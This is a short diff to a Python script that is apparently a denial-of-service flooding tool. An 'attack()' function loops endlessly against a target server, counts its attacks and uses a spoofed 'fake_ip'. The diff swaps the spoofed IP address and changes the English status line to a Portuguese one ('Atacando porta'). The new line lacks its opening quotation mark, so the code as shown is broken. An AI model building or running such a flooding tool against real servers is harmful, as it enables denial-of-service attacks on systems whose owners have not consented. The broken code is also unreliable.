@@ -43,7 +43,7 @@ clear()
 print("\033[94m")
 #########################################################################
 
-fake_ip = '182.21.20.32'
+fake_ip = '77.109.33.232'
 
 def attack():
     while True:
@@ -67,5 +67,5 @@ def attack():
         global attack_num
         attack_num += 1
         print(attack_num)
-        print("[ + ] Attacking Server IP => ",ip," Port ",port,"!")
+        print(Atacando porta 💥")
         s.close()
